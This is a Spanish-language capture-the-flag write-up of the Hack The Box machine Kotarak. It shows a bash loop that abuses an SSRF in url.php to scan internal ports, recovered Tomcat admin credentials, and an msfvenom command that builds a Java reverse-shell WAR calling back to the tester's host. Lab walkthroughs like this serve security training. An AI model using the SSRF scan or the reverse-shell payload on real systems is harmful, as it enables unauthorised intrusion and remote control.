# Kotarak-HTB

## Nmap

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/6e56c404-d431-4ed5-84b1-40bc05965f91)

## Tomcat

Se encontro un servidor tomcat el panel de administracion usualmente esta en:

> manager/html

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/eee4bc02-9e30-4689-9976-99e543ab922a)

## SSRF

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/cf9f356c-a756-452a-a4de-cbf2dbb99653)

Entonces esto nos permite enumerar puertos con un script

```
#!/bin/bash

for i in $(seq 0  65535); do

#sleep 1
#echo $i

data=$(curl -s  "http://10.129.1.117:60000/url.php?path=localhost:${i}"&)
#echo "El puerto que estamos revisando es: $i"
#curl -s  "http://10.129.1.117:60000/url.php?path=localhost:${i}"

if [ ! -z "$data" ]; then

     echo "El puerto que respondio es el $i-----------"
     echo $data

fi

data=''
wait;
done

echo "Finalizado..."
```

Se encontraron varios puertos abiertos lo mas destacado

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/03665140-1b85-4a53-a508-ba59dfe71d8e)

Vemos que tienenel backup 

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/c5f4b0cb-639d-4f2b-aa59-8e082da841af)

> "admin" password="3@g01PdhB!"

## RCE

### msfvenom

Vamos a crear una payload:

```
msfvenom -l payload | grep java

###
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.80 LPORT=443 -f war -o rev.war

```























































